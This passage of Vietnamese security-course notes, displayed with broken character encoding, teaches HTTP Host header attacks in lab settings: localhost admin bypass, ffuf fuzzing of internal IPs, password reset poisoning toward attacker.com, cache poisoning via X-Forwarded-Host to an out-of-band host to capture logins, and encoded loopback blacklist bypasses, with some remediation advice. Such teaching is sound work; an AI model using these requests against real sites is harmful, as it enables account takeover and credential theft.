Khi kiá»ƒm tra **Host header**, thay vÃ¬ dÃ¹ng tÃªn miá»n hoáº·c IP cÃ´ng khai, chÃºng ta cÃ³ thá»ƒ thay Ä‘á»•i **Host header** thÃ nh giÃ¡ trá»‹ `localhost`. Äiá»u nÃ y sáº½ lÃ m cho á»©ng dá»¥ng web tin ráº±ng yÃªu cáº§u Ä‘áº¿n tá»« máº¡ng ná»™i bá»™, tá»« Ä‘Ã³ bá» qua kiá»ƒm tra xÃ¡c thá»±c vÃ  cho phÃ©p káº» táº¥n cÃ´ng truy cáº­p vÃ o khu vá»±c quáº£n trá»‹ mÃ  khÃ´ng cáº§n Ä‘Äƒng nháº­p.

**CÃ¡ch khai thÃ¡c:**
- Gá»­i yÃªu cáº§u HTTP vá»›i **Host header** lÃ  `localhost`:
  ```
  GET /admin.php HTTP/1.1
  Host: localhost
  ```

á»¨ng dá»¥ng web sáº½ tin ráº±ng yÃªu cáº§u Ä‘áº¿n tá»« má»™t máº¡ng ná»™i bá»™ vÃ  cho phÃ©p truy cáº­p vÃ o khu vá»±c quáº£n trá»‹.

#### **3. Fuzzing Host Header**

Náº¿u á»©ng dá»¥ng web kiá»ƒm tra cÃ¡c IP cá»¥ thá»ƒ tá»« máº¡ng ná»™i bá»™, viá»‡c thá»­ nghiá»‡m thá»§ cÃ´ng sáº½ gáº·p khÃ³ khÄƒn vÃ¬ pháº£i kiá»ƒm tra ráº¥t nhiá»u Ä‘á»‹a chá»‰ IP. Tuy nhiÃªn, ta cÃ³ thá»ƒ **fuzz** (thá»­ nghiá»‡m tá»± Ä‘á»™ng) **Host header** Ä‘á»ƒ tÃ¬m cÃ¡c Ä‘á»‹a chá»‰ IP cÃ³ thá»ƒ bá» qua kiá»ƒm tra xÃ¡c thá»±c.

**CÃ´ng cá»¥ Fuzzing:**

ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng cÃ´ng cá»¥ nhÆ° **ffuf** Ä‘á»ƒ fuzz **Host header** vÃ  thá»­ vá»›i cÃ¡c Ä‘á»‹a chá»‰ IP tá»« dáº£i **192.168.0.0-192.168.255.255** (cÃ¡c Ä‘á»‹a chá»‰ IP riÃªng tÆ°).

**BÆ°á»›c 1: Táº¡o danh sÃ¡ch Ä‘á»‹a chá»‰ IP:**

ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng má»™t script bash Ä‘Æ¡n giáº£n Ä‘á»ƒ táº¡o danh sÃ¡ch cÃ¡c Ä‘á»‹a chá»‰ IP trong dáº£i `192.168.0.0-192.168.255.255`:
```bash
for a in {1..255}; do
  for b in {1..255}; do
    echo "192.168.$a.$b" >> ips.txt
  done
done
```

**BÆ°á»›c 2: Sá»­ dá»¥ng **ffuf** Ä‘á»ƒ fuzz Host header:**
```bash
ffuf -u http://IP:PORT/admin.php -w ips.txt -H 'Host: FUZZ' -fs 752
```
Trong Ä‘Ã³:
- `FUZZ` lÃ  vá»‹ trÃ­ sáº½ Ä‘Æ°á»£c thay tháº¿ bá»Ÿi cÃ¡c giÃ¡ trá»‹ trong danh sÃ¡ch `ips.txt`.
- `-fs 752` giÃºp lá»c cÃ¡c pháº£n há»“i cÃ³ kÃ­ch thÆ°á»›c 752 byte, cho phÃ©p chÃºng ta dá»… dÃ ng xÃ¡c Ä‘á»‹nh cÃ¡c pháº£n há»“i khÃ¡c biá»‡t (tá»©c lÃ  cÃ¡c pháº£n há»“i há»£p lá»‡).

**Káº¿t quáº£:**
Káº¿t quáº£ sáº½ hiá»ƒn thá»‹ cÃ¡c Ä‘á»‹a chá»‰ IP mÃ  khi Ä‘Æ°á»£c thay vÃ o **Host header**, á»©ng dá»¥ng web sáº½ tráº£ vá» pháº£n há»“i há»£p lá»‡, cho phÃ©p káº» táº¥n cÃ´ng truy cáº­p vÃ o khu vá»±c quáº£n trá»‹ mÃ  khÃ´ng cáº§n pháº£i xÃ¡c thá»±c.

---
# 10. Táº¥n CÃ´ng Password Reset Poisoning qua Host Header

#### **1. Tá»•ng Quan vá» Password Reset Poisoning**

**Password reset poisoning** lÃ  má»™t lá»— há»•ng phá»• biáº¿n xáº£y ra khi má»™t á»©ng dá»¥ng web sá»­ dá»¥ng khÃ´ng an toÃ n **Host header** Ä‘á»ƒ táº¡o liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u. Lá»— há»•ng nÃ y cÃ³ thá»ƒ bá»‹ khai thÃ¡c náº¿u á»©ng dá»¥ng web sá»­ dá»¥ng **Host header** Ä‘á»ƒ táº¡o liÃªn káº¿t tuyá»‡t Ä‘á»‘i trong cÃ¡c thÃ´ng bÃ¡o email Ä‘áº·t láº¡i máº­t kháº©u. Náº¿u káº» táº¥n cÃ´ng cÃ³ thá»ƒ thay Ä‘á»•i **Host header**, há» cÃ³ thá»ƒ lÃ m cho liÃªn káº¿t trong email chá»‰ Ä‘áº¿n má»™t tÃªn miá»n mÃ  káº» táº¥n cÃ´ng kiá»ƒm soÃ¡t, tá»« Ä‘Ã³ láº¥y cáº¯p mÃ£ thÃ´ng bÃ¡o Ä‘áº·t láº¡i máº­t kháº©u cá»§a ngÆ°á»i dÃ¹ng.

#### **2. PhÃ¡t Hiá»‡n Lá»— Há»•ng**

**BÆ°á»›c 1: Kiá»ƒm tra á»©ng dá»¥ng web**

Trong vÃ­ dá»¥ nÃ y, khi truy cáº­p á»©ng dá»¥ng web, ngÆ°á»i dÃ¹ng sáº½ tháº¥y má»™t mÃ n hÃ¬nh Ä‘Äƒng nháº­p Ä‘Æ¡n giáº£n. Sau khi Ä‘Äƒng nháº­p thÃ nh cÃ´ng, á»©ng dá»¥ng hiá»ƒn thá»‹ má»™t sá»‘ thÃ´ng tin ngÆ°á»i dÃ¹ng cÆ¡ báº£n. Tuy nhiÃªn, khi kiá»ƒm tra lÆ°u lÆ°á»£ng máº¡ng, chÃºng ta nháº­n tháº¥y á»©ng dá»¥ng sá»­ dá»¥ng cÃ¡c liÃªn káº¿t tuyá»‡t Ä‘á»‘i Ä‘á»ƒ táº£i cÃ¡c tá»‡p CSS vÃ  JavaScript.

**BÆ°á»›c 2: Thá»­ nghiá»‡m Host Header**

Äá»ƒ kiá»ƒm tra lá»— há»•ng, ta cÃ³ thá»ƒ thá»­ thay Ä‘á»•i **Host header** trong yÃªu cáº§u HTTP vÃ  xem xÃ©t xem á»©ng dá»¥ng cÃ³ sá»­ dá»¥ng giÃ¡ trá»‹ nÃ y Ä‘á»ƒ táº¡o cÃ¡c liÃªn káº¿t tuyá»‡t Ä‘á»‘i hay khÃ´ng. VÃ­ dá»¥, náº¿u ta thay **Host header** thÃ nh `evil.htb`, á»©ng dá»¥ng cÃ³ thá»ƒ sáº½ sá»­ dá»¥ng giÃ¡ trá»‹ nÃ y Ä‘á»ƒ táº¡o cÃ¡c liÃªn káº¿t trong trang web, cháº³ng háº¡n nhÆ° liÃªn káº¿t Ä‘áº¿n cÃ¡c tá»‡p CSS hoáº·c JavaScript.

DÆ°á»›i Ä‘Ã¢y lÃ  má»™t vÃ­ dá»¥ vá» pháº£n há»“i á»©ng dá»¥ng khi **Host header** bá»‹ thay Ä‘á»•i:
- Host header ban Ä‘áº§u: `evil.htb`
- LiÃªn káº¿t CSS trong pháº£n há»“i: `http://evil.htb/styles.css`

Tuy nhiÃªn, viá»‡c nÃ y chÆ°a pháº£i lÃ  má»™t lá»— há»•ng khai thÃ¡c Ä‘Æ°á»£c. Máº·c dÃ¹ á»©ng dá»¥ng sá»­ dá»¥ng **Host header** Ä‘á»ƒ táº¡o cÃ¡c liÃªn káº¿t tuyá»‡t Ä‘á»‘i, nhÆ°ng khÃ´ng cÃ³ lá»— há»•ng **XSS** vÃ¬ mÃ¡y chá»§ tá»« chá»‘i cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t trong **Host header** vÃ  cÅ©ng khÃ´ng thá»ƒ Ã©p buá»™c trÃ¬nh duyá»‡t cá»§a náº¡n nhÃ¢n gá»­i yÃªu cáº§u vá»›i **Host header** bá»‹ thao tÃºng.

#### **3. Khai ThÃ¡c Password Reset Poisoning**

**BÆ°á»›c 1: PhÃ¡t hiá»‡n tÃ­nh nÄƒng Ä‘áº·t láº¡i máº­t kháº©u**

Khi chÃºng ta thá»­ Ä‘áº·t láº¡i máº­t kháº©u trong á»©ng dá»¥ng, thÃ´ng bÃ¡o xuáº¥t hiá»‡n cho biáº¿t á»©ng dá»¥ng sáº½ gá»­i má»™t liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u qua email.

**BÆ°á»›c 2: Táº¡o liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u vá»›i **Host header** bá»‹ thao tÃºng**

á»¨ng dá»¥ng web sá»­ dá»¥ng **Host header** Ä‘á»ƒ xÃ¢y dá»±ng cÃ¡c liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u vá»›i mÃ£ thÃ´ng bÃ¡o Ä‘áº·t láº¡i trong email. Do Ä‘Ã³, káº» táº¥n cÃ´ng cÃ³ thá»ƒ thao tÃºng **Host header** trong yÃªu cáº§u Ä‘áº·t láº¡i máº­t kháº©u Ä‘á»ƒ liÃªn káº¿t dáº«n Ä‘áº¿n má»™t tÃªn miá»n mÃ  há» kiá»ƒm soÃ¡t.

**BÆ°á»›c 3: Sá»­ dá»¥ng cÃ´ng cá»¥ Exfiltration**

Äá»ƒ thá»±c hiá»‡n táº¥n cÃ´ng, káº» táº¥n cÃ´ng cÃ³ thá»ƒ sá»­ dá»¥ng cÃ´ng cá»¥ nhÆ° **Interactsh** (hoáº·c **interactsh.local** trong mÃ´i trÆ°á»ng thÃ­ nghiá»‡m) Ä‘á»ƒ theo dÃµi cÃ¡c yÃªu cáº§u Ä‘áº¿n tÃªn miá»n mÃ  káº» táº¥n cÃ´ng kiá»ƒm soÃ¡t. Khi káº» táº¥n cÃ´ng gá»­i yÃªu cáº§u Ä‘áº·t láº¡i máº­t kháº©u vá»›i **Host header** bá»‹ thao tÃºng, liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u sáº½ chá»©a mÃ£ thÃ´ng bÃ¡o Ä‘áº·t láº¡i máº­t kháº©u, cho phÃ©p káº» táº¥n cÃ´ng chiáº¿m quyá»n kiá»ƒm soÃ¡t tÃ i khoáº£n cá»§a ngÆ°á»i dÃ¹ng khi há» nháº¥p vÃ o liÃªn káº¿t.

**BÆ°á»›c 4: Thá»±c hiá»‡n táº¥n cÃ´ng**

VÃ­ dá»¥: giáº£ sá»­ chÃºng ta muá»‘n thá»±c hiá»‡n táº¥n cÃ´ng nÃ y Ä‘á»‘i vá»›i ngÆ°á»i dÃ¹ng quáº£n trá»‹ cÃ³ Ä‘á»‹a chá»‰ email lÃ  `[email protected]`. Sau khi gá»­i yÃªu cáº§u Ä‘áº·t láº¡i máº­t kháº©u vá»›i **Host header** bá»‹ thao tÃºng (vÃ­ dá»¥: `attacker.com`), á»©ng dá»¥ng sáº½ gá»­i email chá»©a liÃªn káº¿t Ä‘áº·t láº¡i máº­t kháº©u Ä‘áº¿n ngÆ°á»i dÃ¹ng quáº£n trá»‹.

Khi ngÆ°á»i dÃ¹ng quáº£n trá»‹ nháº¥p vÃ o liÃªn káº¿t trong email, yÃªu cáº§u sáº½ Ä‘Æ°á»£c gá»­i Ä‘áº¿n **attacker.com**, nÆ¡i káº» táº¥n cÃ´ng cÃ³ thá»ƒ thu tháº­p mÃ£ thÃ´ng bÃ¡o Ä‘áº·t láº¡i máº­t kháº©u tá»« URL. Sau Ä‘Ã³, káº» táº¥n cÃ´ng cÃ³ thá»ƒ sá»­ dá»¥ng mÃ£ thÃ´ng bÃ¡o nÃ y Ä‘á»ƒ Ä‘áº·t láº¡i máº­t kháº©u cá»§a náº¡n nhÃ¢n vÃ  chiáº¿m quyá»n truy cáº­p vÃ o tÃ i khoáº£n quáº£n trá»‹.

---
# 11. Táº¥n CÃ´ng Web Cache Poisoning qua Host Header

#### **1. Tá»•ng Quan vá» Web Cache Poisoning**

**Web Cache Poisoning** lÃ  má»™t loáº¡i táº¥n cÃ´ng mÃ  káº» táº¥n cÃ´ng cÃ³ thá»ƒ lá»£i dá»¥ng lá»— há»•ng trong cÃ¡ch á»©ng dá»¥ng web sá»­ dá»¥ng bá»™ nhá»› Ä‘á»‡m (cache) Ä‘á»ƒ áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c ngÆ°á»i dÃ¹ng khÃ¡c. Trong trÆ°á»ng há»£p nÃ y, táº¥n cÃ´ng káº¿t há»£p vá»›i **Host Header** (Ä‘áº·c biá»‡t lÃ  cÃ¡c header thay tháº¿ nhÆ° **X-Forwarded-Host**) cÃ³ thá»ƒ táº¡o ra lá»— há»•ng trong viá»‡c táº¡o cÃ¡c liÃªn káº¿t tuyá»‡t Ä‘á»‘i, gÃ¢y ra sá»± thay Ä‘á»•i dá»¯ liá»‡u trong bá»™ nhá»› Ä‘á»‡m cá»§a á»©ng dá»¥ng.

Trong khi **Host header** thÆ°á»ng lÃ  má»™t pháº§n trong **cache key** (tham sá»‘ xÃ¡c Ä‘á»‹nh cÃ¡ch bá»™ nhá»› Ä‘á»‡m xá»­ lÃ½ yÃªu cáº§u), Ä‘iá»u nÃ y giÃºp ngÄƒn cháº·n táº¥n cÃ´ng web cache poisoning, cÃ¡c header thay tháº¿ mÃ  á»©ng dá»¥ng sá»­ dá»¥ng cÃ³ thá»ƒ khÃ´ng Ä‘Æ°á»£c Ä‘Ã¡nh dáº¥u lÃ  **keyed** (khÃ³a bá»™ nhá»› Ä‘á»‡m). Äiá»u nÃ y táº¡o cÆ¡ há»™i cho viá»‡c Ä‘á»™c háº¡i hÃ³a (poisoning) bá»™ nhá»› Ä‘á»‡m.

#### **2. PhÃ¡t Hiá»‡n Lá»— Há»•ng Web Cache Poisoning**

**BÆ°á»›c 1: Kiá»ƒm Tra CÃ¡c Tham Sá»‘ Keyed**

Khi báº¯t Ä‘áº§u cuá»™c táº¥n cÃ´ng, ta sáº½ kháº£o sÃ¡t á»©ng dá»¥ng web Ä‘á»ƒ tÃ¬m hiá»ƒu cÃ¡c tham sá»‘ **keyed** (tham sá»‘ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xÃ¡c Ä‘á»‹nh bá»™ nhá»› Ä‘á»‡m). á» Ä‘Ã¢y, ta tháº¥y ráº±ng cáº£ **path** vÃ  **Host header** Ä‘á»u lÃ  **keyed** tham sá»‘, cÃ³ nghÄ©a lÃ  á»©ng dá»¥ng sáº½ khÃ´ng bá»‹ táº¥n cÃ´ng Web Cache Poisoning náº¿u chá»‰ thay Ä‘á»•i **Host header**. Tuy nhiÃªn, khÃ´ng cÃ³ tham sá»‘ GET nÃ o cáº§n pháº£i thá»­ nghiá»‡m.

**BÆ°á»›c 2: Thá»­ ThÃªm Header Override**

Tiáº¿p theo, chÃºng ta tháº¥y ráº±ng á»©ng dá»¥ng web sá»­ dá»¥ng **X-Forwarded-Host** header Ä‘á»ƒ xÃ¢y dá»±ng URL tuyá»‡t Ä‘á»‘i cho cÃ¡c tá»‡p JavaScript vÃ  action cá»§a form Ä‘Äƒng nháº­p. VÃ¬ **X-Forwarded-Host** lÃ  **unkeyed** (khÃ´ng pháº£i tham sá»‘ khÃ³a bá»™ nhá»› Ä‘á»‡m), ta cÃ³ thá»ƒ sá»­ dá»¥ng nÃ³ Ä‘á»ƒ gÃ¢y Ä‘á»™c háº¡i bá»™ nhá»› Ä‘á»‡m.

Tuy nhiÃªn, ta cáº§n pháº£i thÃªm má»™t giÃ¡ trá»‹ má»›i cho **Host header** Ä‘á»ƒ trÃ¡nh gÃ¢y xung Ä‘á»™t vá»›i bá»™ nhá»› Ä‘á»‡m (cache buster). Viá»‡c nÃ y sáº½ Ä‘áº£m báº£o ráº±ng bá»™ nhá»› Ä‘á»‡m khÃ´ng phá»¥c vá»¥ cÃ¡c yÃªu cáº§u trÆ°á»›c Ä‘Ã³ mÃ  khÃ´ng bá»‹ nhiá»…u loáº¡n.

#### **3. Khai ThÃ¡c Web Cache Poisoning**

**BÆ°á»›c 1: Chuáº©n Bá»‹ Táº¥n CÃ´ng**

Láº§n nÃ y, chÃºng ta sáº½ khai thÃ¡c lá»— há»•ng báº±ng cÃ¡ch sá»­ dá»¥ng **X-Forwarded-Host** header bá»‹ thao tÃºng Ä‘á»ƒ chuyá»ƒn hÆ°á»›ng yÃªu cáº§u tá»›i má»™t mÃ¡y chá»§ do káº» táº¥n cÃ´ng kiá»ƒm soÃ¡t. Má»¥c tiÃªu lÃ  sá»­ dá»¥ng má»™t **JavaScript import** Ä‘á»™c háº¡i hoáº·c thay Ä‘á»•i hÃ nh Ä‘á»™ng form Ä‘Äƒng nháº­p Ä‘á»ƒ thá»±c hiá»‡n táº¥n cÃ´ng **XSS** hoáº·c láº¥y cáº¯p thÃ´ng tin Ä‘Äƒng nháº­p.

Äá»ƒ thá»±c hiá»‡n táº¥n cÃ´ng nÃ y, ta sá»­ dá»¥ng **Interact.sh** Ä‘á»ƒ theo dÃµi cÃ¡c yÃªu cáº§u tá»« mÃ¡y chá»§ káº» táº¥n cÃ´ng.

**BÆ°á»›c 2: Thá»±c Hiá»‡n YÃªu Cáº§u Web vá»›i Headers Thao TÃºng**

Giáº£ sá»­ á»©ng dá»¥ng web sá»­ dá»¥ng domain `admin.hostheaders.htb` cho **Host header**, ta cÃ³ thá»ƒ gá»­i yÃªu cáº§u HTTP sau:

```
GET /login.php HTTP/1.1
Host: admin.hostheaders.htb
X-Forwarded-Host: cf187gp2vtc0000b03cgg8owd3ayyyyyb.oast.fun
```

Ta gá»­i yÃªu cáº§u nÃ y hai láº§n Ä‘á»ƒ Ä‘áº£m báº£o ráº±ng yÃªu cáº§u thá»© hai sáº½ trÃºng vÃ o bá»™ nhá»› Ä‘á»‡m (cache hit). Sau Ä‘Ã³, ta chá»‰ cáº§n Ä‘á»£i má»™t ngÆ°á»i dÃ¹ng khÃ¡c Ä‘Äƒng nháº­p vÃ o á»©ng dá»¥ng.

**BÆ°á»›c 3: Theo DÃµi Káº¿t Quáº£ trÃªn Interact.sh**

Khi ngÆ°á»i dÃ¹ng khÃ¡c Ä‘Äƒng nháº­p vÃ o á»©ng dá»¥ng, náº¿u bá»™ nhá»› Ä‘á»‡m Ä‘Ã£ bá»‹ Ä‘á»™c háº¡i hÃ³a thÃ nh cÃ´ng, thÃ´ng tin Ä‘Äƒng nháº­p cá»§a há» sáº½ Ä‘Æ°á»£c gá»­i Ä‘áº¿n mÃ¡y chá»§ cá»§a káº» táº¥n cÃ´ng. Ta cÃ³ thá»ƒ theo dÃµi yÃªu cáº§u nÃ y trÃªn **Interact.sh** hoáº·c **interactsh.local** (náº¿u Ä‘ang lÃ m viá»‡c trong mÃ´i trÆ°á»ng giáº£ láº­p).

Sau khi náº¡n nhÃ¢n Ä‘Äƒng nháº­p vÃ  yÃªu cáº§u Ä‘Æ°á»£c xá»­ lÃ½ qua bá»™ nhá»› Ä‘á»‡m bá»‹ nhiá»…m Ä‘á»™c, ta sáº½ tháº¥y yÃªu cáº§u chá»©a thÃ´ng tin Ä‘Äƒng nháº­p cá»§a náº¡n nhÃ¢n, cho phÃ©p káº» táº¥n cÃ´ng chiáº¿m quyá»n truy cáº­p vÃ o tÃ i khoáº£n cá»§a ngÆ°á»i dÃ¹ng.

#### **4. CÃ¡ch NgÄƒn Ngá»«a Web Cache Poisoning**

**Nguy cÆ¡:**
- Web Cache Poisoning cÃ³ thá»ƒ gÃ¢y ra cÃ¡c cuá»™c táº¥n cÃ´ng XSS hoáº·c chiáº¿m quyá»n truy cáº­p tÃ i khoáº£n náº¿u káº» táº¥n cÃ´ng cÃ³ thá»ƒ thay Ä‘á»•i bá»™ nhá»› Ä‘á»‡m cá»§a á»©ng dá»¥ng web.
- CÃ¡c header nhÆ° **X-Forwarded-Host** náº¿u khÃ´ng Ä‘Æ°á»£c xÃ¡c thá»±c Ä‘Ãºng cÃ¡ch cÃ³ thá»ƒ dáº«n Ä‘áº¿n viá»‡c káº» táº¥n cÃ´ng lá»£i dá»¥ng bá»™ nhá»› Ä‘á»‡m.

**Biá»‡n phÃ¡p kháº¯c phá»¥c:**
- Äáº£m báº£o ráº±ng á»©ng dá»¥ng web sá»­ dá»¥ng cÃ¡c **keyed headers** cho táº¥t cáº£ cÃ¡c tham sá»‘, Ä‘áº·c biá»‡t lÃ  **X-Forwarded-Host**, Ä‘á»ƒ Ä‘áº£m báº£o ráº±ng má»—i yÃªu cáº§u Ä‘Æ°á»£c xá»­ lÃ½ riÃªng biá»‡t vÃ  khÃ´ng bá»‹ táº¥n cÃ´ng tá»« cÃ¡c thay Ä‘á»•i trong header.
- KhÃ´ng nÃªn phá»¥ thuá»™c vÃ o cÃ¡c giÃ¡ trá»‹ khÃ´ng Ä‘Æ°á»£c xÃ¡c thá»±c nhÆ° **X-Forwarded-Host** khi táº¡o cÃ¡c liÃªn káº¿t hoáº·c thá»±c hiá»‡n cÃ¡c hÃ nh Ä‘á»™ng quan trá»ng nhÆ° Ä‘Äƒng nháº­p hoáº·c Ä‘áº·t láº¡i máº­t kháº©u.
- Sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o máº­t bá»• sung nhÆ° xÃ¡c thá»±c hai yáº¿u tá»‘ (2FA) Ä‘á»ƒ ngÄƒn cháº·n cÃ¡c cuá»™c táº¥n cÃ´ng chiáº¿m quyá»n truy cáº­p tÃ i khoáº£n.

---
# 12. Táº¥n CÃ´ng Bypass Kiá»ƒm Tra Host Header vÃ  CÃ¡c Lá»— Há»•ng Validation

#### **1. Tá»•ng Quan vá» Táº¥n CÃ´ng Bypass Kiá»ƒm Tra Host Header**

Má»™t trong nhá»¯ng phÆ°Æ¡ng phÃ¡p phá»• biáº¿n mÃ  cÃ¡c á»©ng dá»¥ng web sá»­ dá»¥ng Ä‘á»ƒ ngÄƒn cháº·n cÃ¡c táº¥n cÃ´ng liÃªn quan Ä‘áº¿n **host header** lÃ  kiá»ƒm tra tÃ­nh há»£p lá»‡ cá»§a **host header** trong yÃªu cáº§u. Máº·c dÃ¹ váº­y, náº¿u kiá»ƒm tra nÃ y Ä‘Æ°á»£c triá»ƒn khai má»™t cÃ¡ch khÃ´ng chÃ­nh xÃ¡c, káº» táº¥n cÃ´ng váº«n cÃ³ thá»ƒ bá» qua cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ nÃ y vÃ  thá»±c hiá»‡n cÃ¡c táº¥n cÃ´ng nhÆ° **web cache poisoning** hoáº·c **password reset poisoning**.

Trong bÃ i há»c nÃ y, chÃºng ta sáº½ tÃ¬m hiá»ƒu cÃ¡ch mÃ  káº» táº¥n cÃ´ng cÃ³ thá»ƒ vÆ°á»£t qua kiá»ƒm tra **host header** báº±ng cÃ¡ch sá»­ dá»¥ng nhá»¯ng lá»— há»•ng trong quÃ¡ trÃ¬nh kiá»ƒm tra hoáº·c cÃ¡c phÆ°Æ¡ng phÃ¡p tinh vi Ä‘á»ƒ thao tÃºng yÃªu cáº§u.

#### **2. Nháº­n Dáº¡ng Lá»— Há»•ng Kiá»ƒm Tra Host Header**

**BÆ°á»›c 1: KhÃ¡m PhÃ¡ CÃ¡ch Kiá»ƒm Tra Host Header**

Giáº£ sá»­ á»©ng dá»¥ng web má»¥c tiÃªu lÃ  `bypassingchecks.htb`. Khi chÃºng ta truy cáº­p trang web nÃ y, nÃ³ sáº½ hiá»ƒn thá»‹ má»™t thÃ´ng bÃ¡o xÃ¡c nháº­n ráº±ng cÃ³ má»™t cÆ¡ cháº¿ kiá»ƒm tra **host header** Ä‘Æ°á»£c Ã¡p dá»¥ng. Dá»±a vÃ o thÃ´ng tin nÃ y, chÃºng ta cÃ³ thá»ƒ thá»­ gá»­i má»™t yÃªu cáº§u vá»›i má»™t **host header** tÃ¹y Ã½ Ä‘á»ƒ kiá»ƒm tra pháº£n á»©ng cá»§a á»©ng dá»¥ng.

**BÆ°á»›c 2: PhÃ¢n TÃ­ch MÃ£ Lá»—i Khi Gá»­i YÃªu Cáº§u CÃ³ Host Header TÃ¹y Ã**

Khi chÃºng ta gá»­i yÃªu cáº§u vá»›i **host header** tÃ¹y chá»‰nh, á»©ng dá»¥ng pháº£n há»“i vá»›i má»™t thÃ´ng bÃ¡o lá»—i, Ä‘iá»u nÃ y cho tháº¥y cÆ¡ cháº¿ kiá»ƒm tra **host header** Ä‘Ã£ Ä‘Æ°á»£c triá»ƒn khai. Tuy nhiÃªn, Ä‘Ã¢y chá»‰ lÃ  bÆ°á»›c Ä‘áº§u tiÃªn vÃ  cÃ³ thá»ƒ cÃ³ nhá»¯ng lá»— há»•ng mÃ  káº» táº¥n cÃ´ng cÃ³ thá»ƒ táº­n dá»¥ng.

#### **3. Khai ThÃ¡c Lá»— Há»•ng Validation**

**BÆ°á»›c 1: Bá» Qua Kiá»ƒm Tra Báº±ng CÃ¡ch ThÃªm Cá»•ng (Port)**

Má»™t cÃ¡ch thÃ´ng thÆ°á»ng Ä‘á»ƒ bá» qua kiá»ƒm tra **host header** lÃ  khai thÃ¡c á»©ng dá»¥ng web khi cháº¡y trÃªn má»™t cá»•ng khÃ´ng pháº£i máº·c Ä‘á»‹nh. Kiá»ƒm tra host header cÃ³ thá»ƒ khÃ´ng bao gá»“m pháº§n **cá»•ng** khi xÃ¡c minh. Ta cÃ³ thá»ƒ thá»­ chá»‰ Ä‘á»‹nh má»™t cá»•ng tÃ¹y Ã½ trong **host header** nhÆ° sau:

```
GET / HTTP/1.1
Host: bypassingchecks.htb:1337
```

Trong trÆ°á»ng há»£p nÃ y, á»©ng dá»¥ng web khÃ´ng pháº£n há»“i vá»›i lá»—i vÃ  sáº½ cháº¥p nháº­n **host header** tÃ¹y chá»‰nh nÃ y, Ä‘á»“ng thá»i xÃ¢y dá»±ng cÃ¡c liÃªn káº¿t tuyá»‡t Ä‘á»‘i vá»›i cá»•ng khÃ´ng chÃ­nh xÃ¡c mÃ  chÃºng ta cung cáº¥p. Äiá»u nÃ y cÃ³ thá»ƒ dáº«n Ä‘áº¿n **defacement** (thay Ä‘á»•i giao diá»‡n) cá»§a trang web, nghÄ©a lÃ  giao diá»‡n cá»§a trang web sáº½ bá»‹ thay Ä‘á»•i khi khÃ´ng táº£i Ä‘Æ°á»£c cÃ¡c tá»‡p tÃ i nguyÃªn nhÆ° stylesheet hoáº·c script.

**BÆ°á»›c 2: Káº¿t Há»£p Vá»›i Web Cache Poisoning**

Báº±ng cÃ¡ch káº¿t há»£p táº¥n cÃ´ng **web cache poisoning**, ta cÃ³ thá»ƒ táº¡o ra má»™t cuá»™c táº¥n cÃ´ng **defacement**. Äiá»u nÃ y cÃ³ thá»ƒ lÃ m cho website trá»Ÿ nÃªn khÃ´ng kháº£ dá»¥ng hoáº·c hiá»ƒn thá»‹ sai ná»™i dung do tá»‡p tÃ i nguyÃªn khÃ´ng Ä‘Æ°á»£c táº£i Ä‘Ãºng cÃ¡ch.

#### **4. Sá»­ Dá»¥ng Subdomain Ä‘á»ƒ Bá» Qua Kiá»ƒm Tra**

Má»™t sai sÃ³t phá»• biáº¿n trong viá»‡c kiá»ƒm tra **host header** lÃ  chá»‰ kiá»ƒm tra pháº§n **postfix** cá»§a tÃªn miá»n mÃ  khÃ´ng kiá»ƒm tra xem **host header** cÃ³ thá»±c sá»± lÃ  má»™t subdomain cá»§a tÃªn miá»n má»¥c tiÃªu hay khÃ´ng. Äiá»u nÃ y cho phÃ©p káº» táº¥n cÃ´ng cÃ³ thá»ƒ giáº£ máº¡o má»™t **host header** chá»©a tÃªn miá»n má»¥c tiÃªu dÆ°á»›i dáº¡ng má»™t subdomain.

VÃ­ dá»¥, thay vÃ¬ gá»­i yÃªu cáº§u vá»›i tÃªn miá»n chÃ­nh `bypassingchecks.htb`, káº» táº¥n cÃ´ng cÃ³ thá»ƒ gá»­i yÃªu cáº§u vá»›i má»™t **host header** nhÆ° sau:

```
GET / HTTP/1.1
Host: evilbypassingchecks.htb
```

Káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘Äƒng kÃ½ tÃªn miá»n `evilbypassingchecks.htb` vÃ  lá»£i dá»¥ng nÃ³ Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c táº¥n cÃ´ng nhÆ° **web cache poisoning** hoáº·c **password reset poisoning**, giá»‘ng nhÆ° Ä‘Ã£ mÃ´ táº£ trong cÃ¡c vÃ­ dá»¥ trÆ°á»›c.

#### **5. Bypass Blacklist Kiá»ƒm Tra Host Header**

Má»™t sá»‘ á»©ng dá»¥ng web sá»­ dá»¥ng **blacklist** (danh sÃ¡ch Ä‘en) Ä‘á»ƒ ngÄƒn cháº·n cÃ¡c giÃ¡ trá»‹ **host header** khÃ´ng há»£p lá»‡, nhÆ° `localhost` hoáº·c `127.0.0.1`. Tuy nhiÃªn, cÃ¡c biá»‡n phÃ¡p nÃ y ráº¥t dá»… bá»‹ bá» qua vÃ¬ káº» táº¥n cÃ´ng cÃ³ thá»ƒ sá»­ dá»¥ng cÃ¡c phÆ°Æ¡ng thá»©c mÃ£ hÃ³a hoáº·c biá»ƒu diá»…n khÃ¡c Ä‘á»ƒ vÆ°á»£t qua blacklist.

VÃ­ dá»¥, cÃ¡c káº» táº¥n cÃ´ng cÃ³ thá»ƒ sá»­ dá»¥ng má»™t sá»‘ hÃ¬nh thá»©c mÃ£ hÃ³a Ä‘á»ƒ thay tháº¿ `localhost` hoáº·c `127.0.0.1` trong **host header**:

- **Hexadecimal encoding**: `0x7f000001` (tÆ°Æ¡ng Ä‘Æ°Æ¡ng `127.0.0.1`)
- **Decimal encoding**: `2130706433`
- **Octal encoding**: `0177.0000.0000.0001`
- **IPv6**: `::1`
